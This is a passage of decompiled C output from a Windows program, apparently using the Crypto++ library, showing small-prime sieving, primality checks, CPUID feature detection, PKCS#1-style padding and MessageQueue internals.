          j_j_unknown_libname_61(v11);
        else
          j_j___free_base(v11);
        v12 = v28;
        v13 = v29;
        if ( v27 < v28 )
          v12 = v27;
        LOBYTE(v25) = 9;
        memset(v29, 0, 4 * v12);
        if ( v12 )
          j_j_unknown_libname_61(v13);
        else
          j_j___free_base(v13);
        v14 = v23;
        v15 = v24;
        if ( v22 < v23 )
          v14 = v22;
        LOBYTE(v25) = 10;
        memset(v24, 0, 4 * v14);
        if ( v14 )
          j_j_unknown_libname_61(v15);
        else
          j_j___free_base(v15);
        v3 = a2;
        LOBYTE(v25) = 4;
        if ( !sub_4645F0(a2, (int)v38) )
          break;
        if ( ++v9 >= a3 )
          goto LABEL_31;
      }
      v18 = v40;
      v19 = v41;
      if ( v39 < v40 )
        v18 = v39;
      v25 = 11;
      memset(v41, 0, 4 * v18);
      if ( v18 )
        j_j_unknown_libname_61(v19);
      else
        j_j___free_base(v19);
      return 0;
    }
    else
    {
LABEL_31:
      v16 = v40;
      v17 = v41;
      if ( v39 < v40 )
        v16 = v39;
      v25 = 12;
      memset(v41, 0, 4 * v16);
      if ( v16 )
        j_j_unknown_libname_61(v17);
      else
        j_j___free_base(v17);
      return 1;
    }
  }
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4658E0: using guessed type _DWORD var_3C[2];
// 4658E0: using guessed type _DWORD var_A8[6];
// 4658E0: using guessed type _DWORD var_24[2];
// 4658E0: using guessed type _DWORD var_90[2];
// 4658E0: using guessed type _DWORD var_6C[2];
// 4658E0: using guessed type _DWORD var_54[2];

//----- (00465BB0) --------------------------------------------------------
int sub_465BB0()
{
  int result; // eax
  _DWORD *v1; // eax
  int v2; // edi
  _BYTE *v3; // ecx
  unsigned int v4; // eax
  _BYTE *v5; // eax
  unsigned int v6; // eax
  unsigned int v7; // edx
  unsigned int v8; // ecx
  unsigned __int16 *v9; // ebx
  _BYTE *v10; // eax
  int v11; // esi
  int v12; // [esp+1Ch] [ebp-20h] BYREF
  int v13; // [esp+20h] [ebp-1Ch] BYREF
  _DWORD *v14; // [esp+24h] [ebp-18h]
  unsigned int v15; // [esp+28h] [ebp-14h]
  unsigned int v16; // [esp+2Ch] [ebp-10h]
  int v17; // [esp+38h] [ebp-4h]

  if ( dword_4F0118 > *(_DWORD *)(*((_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + TlsIndex) + 4) )
  {
    _Init_thread_header(&dword_4F0118);
    if ( dword_4F0118 == -1 )
    {
      dword_4F0114 = 0;
      atexit(sub_4B7B00);
      _Init_thread_footer(&dword_4F0118);
    }
  }
  result = dword_4F0114;
  if ( !dword_4F0114 )
  {
    v1 = operator new(0xCu);
    v2 = (int)v1;
    v14 = v1;
    if ( v1 )
    {
      *v1 = 0;
      v1[1] = 0;
      v1[2] = 0;
    }
    else
    {
      v2 = 0;
      v14 = 0;
    }
    v3 = *(_BYTE **)(v2 + 8);
    v4 = (int)&v3[-*(_DWORD *)v2] >> 1;
    v17 = 0;
    if ( v4 < 0xDB7 )
    {
      sub_4661D0(v2, 0xDB7u);
      v3 = *(_BYTE **)(v2 + 8);
    }
    v5 = *(_BYTE **)(v2 + 4);
    v13 = 2;
    if ( v3 == v5 )
    {
      sub_462D20((const void **)v2, v5, &v13);
    }
    else
    {
      *(_WORD *)v5 = 2;
      *(_DWORD *)(v2 + 4) += 2;
    }
    v6 = 1;
    v7 = 3;
    v15 = 1;
    v16 = 3;
    do
    {
      v8 = 1;
      if ( v6 > 1 )
      {
        v9 = (unsigned __int16 *)(*(_DWORD *)v2 + 2);
        do
        {
          if ( !(v7 % *v9) )
            break;
          v7 = v16;
          ++v8;
          ++v9;
        }
        while ( v8 < v15 );
        v2 = (int)v14;
        v6 = v15;
        v7 = v16;
      }
      if ( v8 == v6 )
      {
        v12 = (unsigned __int16)v7;
        v10 = *(_BYTE **)(v2 + 4);
        if ( *(_BYTE **)(v2 + 8) == v10 )
        {
          sub_462D20((const void **)v2, v10, &v12);
          v7 = v16;
        }
        else
        {
          *(_WORD *)v10 = v7;
          *(_DWORD *)(v2 + 4) += 2;
        }
        v6 = 54;
        if ( (unsigned int)((*(_DWORD *)(v2 + 4) - *(_DWORD *)v2) >> 1) < 0x36 )
          v6 = (*(_DWORD *)(v2 + 4) - *(_DWORD *)v2) >> 1;
        v15 = v6;
      }
      v7 += 2;
      v16 = v7;
    }
    while ( v7 <= 0x7FCF );
    v11 = dword_4F0114;
    if ( dword_4F0114 )
    {
      sub_4631A0((_DWORD *)v2, 1);
      return v11;
    }
    else
    {
      dword_4F0114 = v2;
      return v2;
    }
  }
  return result;
}
// 46C388: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 46C3D2: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4F0114: using guessed type int dword_4F0114;
// 4F0118: using guessed type int dword_4F0118;
// 4F0864: using guessed type int TlsIndex;

//----- (00465DB0) --------------------------------------------------------
int sub_465DB0()
{
  int result; // eax
  _DWORD *v1; // esi
  _DWORD *v2; // eax
  unsigned int v3; // eax
  unsigned int v4; // edx
  void *v5; // ebx
  int v6; // edi
  int v7; // [esp+10h] [ebp-2Ch] BYREF
  unsigned int v8; // [esp+18h] [ebp-24h]
  unsigned int v9; // [esp+1Ch] [ebp-20h]
  void *Block; // [esp+20h] [ebp-1Ch]
  _DWORD *v11; // [esp+28h] [ebp-14h]
  unsigned int v12; // [esp+2Ch] [ebp-10h]
  int v13; // [esp+38h] [ebp-4h]

  v12 = 0;
  if ( dword_4F0120 > *(_DWORD *)(*((_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + TlsIndex) + 4) )
  {
    _Init_thread_header(&dword_4F0120);
    if ( dword_4F0120 == -1 )
    {
      dword_4F011C = 0;
      atexit(sub_4B7B70);
      _Init_thread_footer(&dword_4F0120);
    }
  }
  result = dword_4F011C;
  if ( !dword_4F011C )
  {
    v1 = operator new(0x18u);
    v11 = v1;
    v13 = 0;
    if ( v1 )
    {
      v2 = sub_43D500(&v7, 0x7FCFu);
      LOBYTE(v13) = 1;
      v12 = 1;
      sub_44E440(v2, v1, (int)v2);
      v3 = 3;
      v12 = 3;
    }
    else
    {
      v3 = v12;
      v1 = 0;
    }
    v13 = -1;
    if ( (v3 & 1) != 0 )
    {
      v12 = v3 & 0xFFFFFFFE;
      v4 = v9;
      v5 = Block;
      if ( v8 < v9 )
        v4 = v8;
      v13 = 3;
      memset(Block, 0, 4 * v4);
      if ( v4 )
        j_j_unknown_libname_61(v5);
      else
        j_j___free_base(v5);
    }
    v6 = dword_4F011C;
    if ( dword_4F011C )
    {
      if ( v1 )
        (*(void (__thiscall **)(_DWORD *, int))*v1)(v1, 1);
      return v6;
    }
    else
    {
      dword_4F011C = (int)v1;
      return (int)v1;
    }
  }
  return result;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 46C388: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 46C3D2: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4F011C: using guessed type int dword_4F011C;
// 4F0120: using guessed type int dword_4F0120;
// 4F0864: using guessed type int TlsIndex;

//----- (00465F20) --------------------------------------------------------
void __cdecl sub_465F20(_DWORD *a1, unsigned __int16 a2, _DWORD *a3, _DWORD *a4, unsigned __int16 a5)
{
  char v5; // bl
  _DWORD *v6; // esi
  unsigned int v7; // ebx
  unsigned int v8; // eax
  _DWORD *v9; // esi
  char v10; // dl
  _DWORD v11[6]; // [esp+10h] [ebp-78h] BYREF
  _DWORD v12[6]; // [esp+28h] [ebp-60h] BYREF
  _DWORD v13[6]; // [esp+40h] [ebp-48h] BYREF
  _DWORD v14[6]; // [esp+58h] [ebp-30h] BYREF
  unsigned int v15; // [esp+70h] [ebp-18h]
  unsigned int v16; // [esp+74h] [ebp-14h]
  int v17; // [esp+78h] [ebp-10h]
  int v18; // [esp+84h] [ebp-4h]
  char v19; // [esp+A3h] [ebp+1Bh]

  v5 = 0;
  v17 = 0;
  if ( a5 )
  {
    v6 = a1;
    v15 = a1[3];
    v16 = (a2 - sub_4433F0(a3, a2)) * (unsigned int)a5 % a2;
    if ( (unsigned int)sub_44E560(a3) > 1 )
      goto LABEL_4;
    sub_43D500(v11, a2);
    v18 = 0;
    v17 = 1;
    sub_43D500(v12, v16);
    v18 = 1;
    v17 = 3;
    sub_44E440(a4, v13, (int)v12);
    v18 = 2;
    v17 = 23;
    sub_443C50(a3, v14, (int)v13);
    v18 = 3;
    v5 = 63;
    v17 = 63;
    v19 = 1;
    if ( sub_440F30(v14, (int)v11) )
LABEL_4:
      v19 = 0;
    if ( (v5 & 8) != 0 )
    {
      v5 &= ~8u;
      sub_4066A0((int)v14);
    }
    if ( (v5 & 4) != 0 )
    {
      v5 &= ~4u;
      sub_4066A0((int)v13);
    }
    if ( (v5 & 2) != 0 )
    {
      v5 &= ~2u;
      sub_4066A0((int)v12);
    }
    if ( (v5 & 1) != 0 )
      sub_4066A0((int)v11);
    v7 = v15;
    v8 = a2 + v16;
    if ( !v19 )
      v8 = v16;
    if ( v8 < v15 )
    {
      do
      {
        v9 = (_DWORD *)(*v6 + 4 * (v8 >> 5));
        v10 = v8 & 0x1F;
        v8 += a2;
        *v9 |= 1 << v10;
        v6 = a1;
      }
      while ( v8 < v7 );
    }
  }
}
// 465F20: using guessed type _DWORD var_78[6];
// 465F20: using guessed type _DWORD var_60[6];
// 465F20: using guessed type _DWORD var_48[6];
// 465F20: using guessed type _DWORD var_30[6];

//----- (004660A0) --------------------------------------------------------
char __cdecl sub_4660A0(_DWORD *a1, unsigned int a2)
{
  unsigned __int16 **v2; // eax
  int v3; // esi
  int v4; // ebx
  unsigned int v5; // ecx
  unsigned int v6; // eax

  v2 = (unsigned __int16 **)sub_465BB0();
  v3 = 0;
  v4 = (int)*v2;
  v5 = **v2;
  if ( v5 >= a2 )
    return a2 == *(unsigned __int16 *)(v4 + 2 * v3) && sub_4433F0(a1, a2) == 0;
  while ( sub_4433F0(a1, (unsigned __int16)v5) )
  {
    v6 = *(unsigned __int16 *)(v4 + 2 * v3++ + 2);
    LOWORD(v5) = v6;
    if ( v6 >= a2 )
      return a2 == *(unsigned __int16 *)(v4 + 2 * v3) && sub_4433F0(a1, a2) == 0;
  }
  return 1;
}

//----- (00466110) --------------------------------------------------------
bool __cdecl sub_466110(int *a1, _DWORD *a2, int a3)
{
  bool result; // al

  result = sub_463D10(a2) && sub_4658E0(a1, a2, 1u);
  if ( a3 )
    return result && sub_4658E0(a1, a2, 0xAu);
  return result;
}

//----- (00466170) --------------------------------------------------------
int __thiscall sub_466170(_DWORD *this, int a2, int a3, int a4)
{
  _DWORD *v5; // eax
  int result; // eax

  v5 = (_DWORD *)*this;
  if ( *this )
  {
    if ( ((this[2] - (_DWORD)v5) & 0xFFFFFFFE) >= 0x1000 )
    {
      if ( (unsigned int)v5 - *(v5 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v5 = (_DWORD *)*(v5 - 1);
    }
    sub_46C87D(v5);
  }
  *this = a2;
  this[1] = a2 + 2 * a3;
  result = a2 + 2 * a4;
  this[2] = result;
  return result;
}

//----- (004661D0) --------------------------------------------------------
char *__thiscall sub_4661D0(int this, unsigned int a2)
{
  unsigned int v2; // ebp
  int v4; // ebx
  _DWORD *v5; // edi
  _DWORD *v6; // edx
  char *result; // eax

  v2 = a2;
  v4 = (*(_DWORD *)(this + 4) - *(_DWORD *)this) >> 1;
  v5 = sub_466250(a2);
  memmove_0(v5, *(const void **)this, *(_DWORD *)(this + 4) - *(_DWORD *)this);
  v6 = *(_DWORD **)this;
  if ( *(_DWORD *)this )
  {
    if ( ((*(_DWORD *)(this + 8) - (_DWORD)v6) & 0xFFFFFFFE) >= 0x1000 )
    {
      if ( (unsigned int)v6 - *(v6 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v6 = (_DWORD *)*(v6 - 1);
      v2 = a2;
    }
    sub_46C87D(v6);
  }
  *(_DWORD *)this = v5;
  *(_DWORD *)(this + 4) = (char *)v5 + 2 * v4;
  result = (char *)v5 + 2 * v2;
  *(_DWORD *)(this + 8) = result;
  return result;
}

//----- (00466250) --------------------------------------------------------
_DWORD *__stdcall sub_466250(unsigned int a1)
{
  unsigned int v1; // ecx
  size_t v2; // eax
  void *v3; // eax
  void *v4; // ecx
  _DWORD *result; // eax

  v1 = 2 * a1;
  if ( a1 <= 0x7FFFFFFF )
  {
    if ( v1 < 0x1000 )
    {
      if ( v1 )
        return operator new(2 * a1);
      else
        return 0;
    }
  }
  else
  {
    v1 = -1;
  }
  v2 = v1 + 35;
  if ( v1 + 35 <= v1 )
    v2 = -1;
  v3 = operator new(v2);
  v4 = v3;
  if ( !v3 )
    _invalid_parameter_noinfo_noreturn();
  result = (_DWORD *)(((unsigned int)v3 + 35) & 0xFFFFFFE0);
  *(result - 1) = v4;
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (004662B0) --------------------------------------------------------
unsigned int *__thiscall sub_4662B0(int *this, unsigned int *a2, int a3, int a4, int a5, int a6)
{
  int v6; // edx
  int v7; // ebp
  unsigned int v8; // edi
  int *v9; // esi
  unsigned int v10; // ecx
  int *v11; // ebx
  int v12; // edx
  int *v13; // edx
  int v14; // ebp
  int v15; // eax
  int v16; // eax
  int *v17; // ebx
  int v18; // ecx
  unsigned int v19; // esi
  unsigned int v20; // edi
  int v21; // esi
  int v22; // ecx
  unsigned int v23; // ecx
  unsigned int *result; // eax
  int v25; // [esp+10h] [ebp-10h]
  int *v27; // [esp+18h] [ebp-8h] BYREF
  unsigned int v28; // [esp+1Ch] [ebp-4h]

  v6 = *this;
  v7 = this[3];
  v8 = 0;
  v25 = *this;
  v9 = (int *)*this;
  v27 = (int *)*this;
  v28 = 0;
  if ( v7 )
  {
    sub_463140(&v27, a4 + 32 * ((a3 - v6) >> 2));
    v8 = v28;
    v9 = v27;
    v6 = v25;
  }
  v10 = 0;
  v11 = (int *)v6;
  v27 = (int *)v6;
  v28 = 0;
  if ( v7 )
  {
    sub_463140(&v27, a6 + 32 * ((a5 - v6) >> 2));
    v10 = v28;
    v11 = v27;
  }
  v12 = v8 + 32 * (((int)v9 - v25) >> 2);
  v27 = (int *)v12;
  if ( v9 == v11 && v8 == v10 )
  {
    v17 = this;
  }
  else
  {
    if ( v7 >= 0 )
      v13 = (int *)(v25 + 4 * ((unsigned int)v7 >> 5));
    else
      v13 = (int *)(v25 - (4 * ((unsigned int)~v7 >> 5) + 4));
    v14 = v7 & 0x1F;
    while ( v11 != v13 || v10 != v14 )
    {
      v15 = *v9;
      if ( ((1 << v10) & *v11) != 0 )
        v16 = v15 | (1 << v8);
      else
        v16 = v15 & ~(1 << v8);
      *v9 = v16;
      if ( v8 >= 0x1F )
      {
        v8 = 0;
        ++v9;
      }
      else
      {
        ++v8;
      }
      if ( v10 >= 0x1F )
      {
        v10 = 0;
        ++v11;
      }
      else
      {
        ++v10;
      }
    }
    v17 = this;
    v12 = (int)v27;
    v18 = *this;
    v19 = v8 + 32 * (((int)v9 - *this) >> 2);
    if ( v19 > 0x7FFFFFFF )
      sub_462BF0(this);
    v20 = (v19 + 31) >> 5;
    if ( v20 < (this[1] - v18) >> 2 )
      this[1] = v18 + 4 * v20;
    this[3] = v19;
    v21 = v19 & 0x1F;
    if ( v21 )
      *(_DWORD *)(v18 + 4 * v20 - 4) &= (1 << v21) - 1;
  }
  v22 = *v17;
  if ( v12 >= 0 )
    v23 = v22 + 4 * ((unsigned int)v12 >> 5);
  else
    v23 = v22 - (4 * ((unsigned int)~v12 >> 5) + 4);
  result = a2;
  *a2 = v23;
  a2[1] = v12 & 0x1F;
  return result;
}
// 466352: conditional instruction was optimized away because ebp.4<0
// 466417: conditional instruction was optimized away because edx.4<0
// 462BF0: using guessed type void __thiscall __noreturn sub_462BF0(_DWORD);

//----- (00466460) --------------------------------------------------------
void __thiscall sub_466460(int *this, unsigned int a2, char a3)
{
  unsigned int v4; // edx
  int v5; // esi
  int v6; // esi
  int v7; // ebx
  int v8; // eax
  int v9; // edx
  int *v10; // edx
  unsigned int v11; // ecx
  char v12; // si
  int *v13; // edi
  int v14; // esi
  int v15; // eax
  int v16; // eax
  int *v17; // eax
  int v18; // edi
  int v19; // esi
  int *v20; // eax
  int v21; // [esp+10h] [ebp-18h] BYREF
  int v22; // [esp+14h] [ebp-14h]
  int v23; // [esp+18h] [ebp-10h] BYREF
  int v24; // [esp+20h] [ebp-8h] BYREF

  v4 = this[3];
  if ( v4 >= a2 )
  {
    if ( v4 > a2 )
    {
      v17 = sub_462C00(this, &v23);
      v22 = 0;
      v18 = *v17;
      v19 = v17[1];
      v21 = *this;
      v20 = sub_462A20(&v21, &v24, a2);
      sub_4662B0(this, (unsigned int *)&v21, *v20, v20[1], v18, v19);
    }
  }
  else
  {
    v5 = *this;
    if ( (v4 & 0x80000000) == 0 )
      v6 = v5 + 4 * (v4 >> 5);
    else
      v6 = v5 - (4 * (~v4 >> 5) + 4);
    v7 = a2 - v4;
    v8 = sub_462A90((int)this, v6, this[3] & 0x1F, a2 - this[3]);
    v9 = *this;
    v22 = 0;
    if ( v8 >= 0 )
      v10 = (int *)(v9 + 4 * ((unsigned int)v8 >> 5));
    else
      v10 = (int *)(v9 - (4 * ((unsigned int)~v8 >> 5) + 4));
    v11 = v8 & 0x1F;
    if ( v7 >= 0 || v11 >= -v7 )
    {
      v12 = v11 + v7;
      v13 = &v10[(v11 + v7) >> 5];
    }
    else
    {
      v12 = v11 + v7;
      v13 = &v10[-(~(v11 + v7) >> 5) - 1];
    }
    v14 = v12 & 0x1F;
    while ( v10 != v13 || v11 != v14 )
    {
      v15 = *v10;
      if ( a3 )
        v16 = v15 | (1 << v11);
      else
        v16 = v15 & ~(1 << v11);
      *v10 = v16;
      if ( v11 >= 0x1F )
      {
        v11 = 0;
        ++v10;
      }
      else
      {
        ++v11;
      }
    }
  }
}
// 466483: conditional instruction was optimized away because edx.4<0
// 4664C1: conditional instruction was optimized away because eax.4<0

//----- (00466590) --------------------------------------------------------
int sub_466590()
{
  char v10; // al
  bool v11; // dl
  bool v12; // dl
  bool v13; // dl
  bool v14; // dl
  bool v15; // al
  int v16; // esi
  int result; // eax
  __int16 v43; // [esp+20h] [ebp-30h]
  int v44; // [esp+28h] [ebp-28h]
  unsigned int v45; // [esp+30h] [ebp-20h]
  int v46; // [esp+34h] [ebp-1Ch]
  int v47; // [esp+38h] [ebp-18h]
  int v48; // [esp+3Ch] [ebp-14h]

  _EAX = 0;
  __asm { cpuid }
  v45 = _EAX;
  _EAX = 1;
  v46 = _EBX;
  v47 = _ECX;
  v48 = _EDX;
  __asm { cpuid }
  v43 = _EAX;
  v44 = _ECX;
  if ( (_EDX & 0x4000000) != 0 )
  {
    if ( (_ECX & 0x8000000) != 0 || (v10 = sub_4689A0()) != 0 )
    {
      _ECX = v44;
      v10 = 1;
      byte_4F0125 = 1;
    }
    else
    {
      _ECX = v44;
      byte_4F0125 = 0;
    }
  }
  else
  {
    v10 = byte_4F0125;
  }
  v11 = v10 && (_ECX & 0x200) != 0;
  byte_4F0126 = v11;
  v12 = v10 && (_ECX & 0x80000) != 0;
  byte_4F0127 = v12;
  v13 = v10 && (_ECX & 0x100000) != 0;
  byte_4F0128 = v13;
  v14 = v10 && (_ECX & 0x2000000) != 0;
  byte_4F012B = v14;
  v15 = v10 && (_ECX & 2) != 0;
  byte_4F012C = v15;
  if ( (_ECX & 0x18000000) == 402653184 )
  {
    __asm { xgetbv }
    _ECX = v44;
    byte_4F0129 = 0;
  }
  if ( v46 == 1970169159 && v47 == 1818588270 && v48 == 1231384169 )
  {
    byte_4F012F = (v43 & 0xF00) == 3840;
    v16 = 8 * BYTE1(_EBX);
    byte_4F0130 = (_ECX & 0x40000000) != 0;
    if ( v45 >= 7 )
    {
      _EAX = 7;
      __asm { cpuid }
      byte_4F0131 = (_EBX & 0x40000) != 0;
      byte_4F012E = (_EBX & 0x80000) != 0;
      byte_4F012D = (_EBX & 0x20000000) != 0;
      byte_4F012A = (_EBX & 0x20) != 0;
    }
  }
  else if ( v46 == 1752462657 && v47 == 1145913699 && v48 == 1769238117
         || v46 == 1869052232 && v47 == 1701734773 && v48 == 1852131182 )
  {
    _EAX = -2147483643;
    __asm { cpuid }
    v16 = (unsigned __int8)_ECX;
    byte_4F0130 = (v44 & 0x40000000) != 0;
    if ( v45 >= 7 )
    {
      _EAX = 7;
      __asm { cpuid }
      byte_4F0131 = (_EBX & 0x40000) != 0;
      byte_4F012E = (_EBX & 0x80000) != 0;
      byte_4F012D = (_EBX & 0x20000000) != 0;
      byte_4F012A = (_EBX & 0x20) != 0;
    }
  }
  else
  {
    if ( v46 == 1953391939 && v47 == 1936487777 && v48 == 1215460705 )
    {
      _EAX = -1073741824;
      __asm { cpuid }
      if ( _EAX >= 0xC0000001 )
      {
        _EAX = -1073741823;
        __asm { cpuid }
        byte_4F0132 = (_EDX & 0xC) == 12;
        byte_4F0133 = (_EDX & 0xC0) == 0xC0;
        byte_4F0134 = (_EDX & 0x300) == 768;
        byte_4F0135 = (_EDX & 0xC00) == 3072;
        byte_4F0136 = (_EDX & 0x3000) == 12288;
      }
    }
    v16 = dword_4E80BC;
  }
  result = 32;
  if ( !v16 )
    v16 = 32;
  dword_4E80BC = v16;
  byte_4F0124 = 1;
  return result;
}
// 4E80BC: using guessed type int dword_4E80BC;
// 4F0124: using guessed type char byte_4F0124;
// 4F0125: using guessed type char byte_4F0125;
// 4F0126: using guessed type char byte_4F0126;
// 4F0127: using guessed type char byte_4F0127;
// 4F0128: using guessed type char byte_4F0128;
// 4F0129: using guessed type char byte_4F0129;
// 4F012A: using guessed type char byte_4F012A;
// 4F012B: using guessed type char byte_4F012B;
// 4F012C: using guessed type char byte_4F012C;
// 4F012D: using guessed type char byte_4F012D;
// 4F012E: using guessed type char byte_4F012E;
// 4F012F: using guessed type char byte_4F012F;
// 4F0130: using guessed type char byte_4F0130;
// 4F0131: using guessed type char byte_4F0131;
// 4F0132: using guessed type char byte_4F0132;
// 4F0133: using guessed type char byte_4F0133;
// 4F0134: using guessed type char byte_4F0134;
// 4F0135: using guessed type char byte_4F0135;
// 4F0136: using guessed type char byte_4F0136;

//----- (00466920) --------------------------------------------------------
int __thiscall sub_466920(
        void *this,
        int a2,
        int a3,
        int a4,
        int a5,
        void *Src,
        size_t Size,
        int a8,
        _BYTE *a9,
        unsigned int a10)
{
  _BYTE *v10; // esi
  int v12; // [esp+34h] [ebp+24h]

  v10 = a9;
  if ( (a10 & 7) != 0 )
  {
    *a9 = 0;
    v10 = a9 + 1;
  }
  *v10 = 1;
  v12 = (int)&v10[(a10 >> 3) - (*(int (__thiscall **)(void *))(*(_DWORD *)a5 + 32))(this)];
  memset(v10 + 1, 255, v12 - Size - 1 - (_DWORD)(v10 + 1));
  *(_BYTE *)(v12 - Size - 1) = 0;
  memmove((void *)(v12 - Size), Src, Size);
  return (*(int (__thiscall **)(int, int))(*(_DWORD *)a5 + 24))(a5, v12);
}

//----- (004669A0) --------------------------------------------------------
_DWORD *__thiscall sub_4669A0(_DWORD *this, int a2)
{
  int v3; // edx
  int v4; // ecx
  int v5; // eax
  unsigned int v6; // edi
  int v7; // eax
  int v8; // ecx
  int v9; // eax
  int v10; // edi
  int v11; // edx
  int v12; // ecx
  int v13; // eax
  unsigned int v14; // edi
  int v15; // eax
  int v16; // ecx
  _DWORD *result; // eax
  _DWORD *v18; // [esp+10h] [ebp-24h]
  _DWORD *v19; // [esp+10h] [ebp-24h]
  int v20; // [esp+20h] [ebp-14h]
  int v21; // [esp+3Ch] [ebp+8h]

  sub_435E90(this, 0);
  this[3] = -1;
  *this = &CryptoPP::MessageQueue::`vftable';
  this[1] = &CryptoPP::MessageQueue::`vftable';
  sub_45F0D0((int)(this + 4), a2);
  this[14] = 0;
  this[15] = 0;
  this[16] = 0;
  this[17] = 0;
  this[18] = 0;
  v18 = operator new(8u);
  *v18 = this + 14;
  v18[1] = 0;
  this[14] = v18;
  v3 = this[18];
  v4 = this[17];
  if ( (((_BYTE)v4 + (_BYTE)v3) & 1) == 0 && this[16] <= (unsigned int)(v3 + 2) >> 1 )
  {
    sub_467490(this + 14, (void *)1);
    v4 = this[17];
  }
  v5 = v4 & (2 * this[16] - 1);
  this[17] = v5;
  v6 = v5 + this[18];
  v7 = 4 * ((v6 >> 1) & (this[16] - 1));
  v8 = this[15];
  v20 = v7;
  if ( !*(_DWORD *)(v8 + v7) )
  {
    *(_DWORD *)(v7 + this[15]) = operator new(0x10u);
    v7 = v20;
    v8 = this[15];
  }
  v9 = *(_DWORD *)(v8 + v7);
  v10 = v6 & 1;
  *(_DWORD *)(v9 + 8 * v10) = 0;
  *(_DWORD *)(v9 + 8 * v10 + 4) = 0;
  ++this[18];
  this[19] = 0;
  this[20] = 0;
  this[21] = 0;
  this[22] = 0;
  this[23] = 0;
  v19 = operator new(8u);
  *v19 = this + 19;
  v19[1] = 0;
  this[19] = v19;
  v11 = this[23];
  v12 = this[22];
  if ( (((_BYTE)v11 + (_BYTE)v12) & 3) == 0 && this[21] <= (unsigned int)(v11 + 4) >> 2 )
  {
    sub_4672F0(this + 19, (void *)1);
    v12 = this[22];
  }
  v13 = v12 & (4 * this[21] - 1);
  this[22] = v13;
  v14 = v13 + this[23];
  v15 = 4 * ((v14 >> 2) & (this[21] - 1));
  v16 = this[20];
  v21 = v15;
  if ( !*(_DWORD *)(v16 + v15) )
  {
    *(_DWORD *)(v15 + this[20]) = operator new(0x10u);
    v15 = v21;
    v16 = this[20];
  }
  *(_DWORD *)(*(_DWORD *)(v16 + v15) + 4 * (v14 & 3)) = 0;
  result = this;
  ++this[23];
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4BCD18: using guessed type void *CryptoPP::MessageQueue::`vftable';
// 4BCDD0: using guessed type void *CryptoPP::MessageQueue::`vftable';

//----- (00466BFD) --------------------------------------------------------
_DWORD *__thiscall sub_466BFD(_DWORD *this, char a2)
{
  return sub_466C10(this - 1, a2);
}

//----- (00466C10) --------------------------------------------------------
_DWORD *__thiscall sub_466C10(_DWORD *this, char a2)
{
  void *v4; // [esp-8h] [ebp-10h]
  void *v5; // [esp-8h] [ebp-10h]

  sub_467630(this + 19);
  v4 = (void *)this[19];
  this[19] = 0;
  sub_46C87D(v4);
  sub_467630(this + 14);
  v5 = (void *)this[14];
  this[14] = 0;
  sub_46C87D(v5);
  boost::exception::~exception((boost::exception *)(this + 4));
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 45F280: using guessed type void __thiscall boost::exception::~exception(boost::exception *__hidden this);

//----- (00466C70) --------------------------------------------------------
bool __thiscall sub_466C70(_DWORD *this)
{
  unsigned int v1; // edx
  _DWORD *v2; // esi
  int v3; // ecx
  int v4; // edx
  int v5; // eax

  v1 = this[17];
  v2 = (_DWORD *)this[14];
  if ( v2 )
    v2 = (_DWORD *)*v2;
  v3 = (v2[2] - 1) & (v1 >> 1);
  v4 = v1 & 1;
  v5 = *(_DWORD *)(v2[1] + 4 * v3);
  return *(_DWORD *)(v5 + 8 * v4 + 4) || *(_DWORD *)(v5 + 8 * v4);
}

//----- (00466CB0) --------------------------------------------------------
int __userpurge sub_466CB0@<eax>(
        _DWORD *a1@<ecx>,
        int a2@<edi>,
        int a3,
        unsigned __int64 *a4,
        int a5,
        unsigned int a6,
        unsigned int a7,
        int a8)
{
  unsigned __int64 v9; // rax
  unsigned int v11; // eax
  unsigned int v12; // edx
  unsigned int v13; // ecx
  unsigned int v14; // edx
  unsigned int v15; // edi

  LODWORD(v9) = (*(int (__thiscall **)(_DWORD *))(*a1 + 64))(a1);
  if ( *a4 >= v9 )
    return 0;
  v11 = (*(int (__thiscall **)(_DWORD *, int))(*a1 + 64))(a1, a2);
  v13 = v12;
  v14 = a7;
  if ( a7 > v13 || (v15 = a6, a7 >= v13) && a6 >= v11 )
  {
    v15 = v11;
    v14 = v13;
  }
  return (*(int (__thiscall **)(_DWORD *, unsigned __int64 *, unsigned __int64 *, unsigned int, unsigned int, int))(a1[4] + 132))(
           a1 + 4,
           a4,
           a4,
           v15,
           v14,
           a8);
}
// 466CC8: variable 'v9' is possibly undefined
// 466CDB: variable 'v12' is possibly undefined

//----- (00466D20) --------------------------------------------------------
char __thiscall sub_466D20(_DWORD *this)
{
  int *****v3; // eax
  int ***v4; // ecx
  int ****v5; // eax
  int *v6; // eax
  int **v7; // ecx
  int v8; // edx
  unsigned int v9; // eax

  if ( !(*(int (__thiscall **)(_DWORD *))(*this + 96))(this)
    || (*(unsigned __int8 (__thiscall **)(_DWORD *))(*this + 68))(this) )
  {
    return 0;
  }
  if ( this[18]-- == 1 )
    this[17] = 0;
  else
    ++this[17];
  v3 = (int *****)this[19];
  v4 = 0;
  if ( v3 )
  {
    v5 = *v3;
    if ( v5 )
      v4 = *v5;
  }
  v6 = 0;
  if ( v4 )
  {
    v7 = *v4;
    if ( v7 )
      v6 = *v7;
  }
  if ( v6 )
    v8 = *v6;
  else
    v8 = 0;
  if ( !*(_DWORD *)(*(_DWORD *)(*(_DWORD *)(v8 + 4) + 4 * ((*(_DWORD *)(v8 + 8) - 1) & (this[22] >> 2)))
                  + 4 * (this[22] & 3)) )
  {
    v9 = this[23];
    if ( v9 > 1 )
    {
      this[23] = v9 - 1;
      ++this[22];
    }
  }
  return 1;
}
// 466DA5: conditional instruction was optimized away because eax.4>=2u

//----- (00466DC0) --------------------------------------------------------
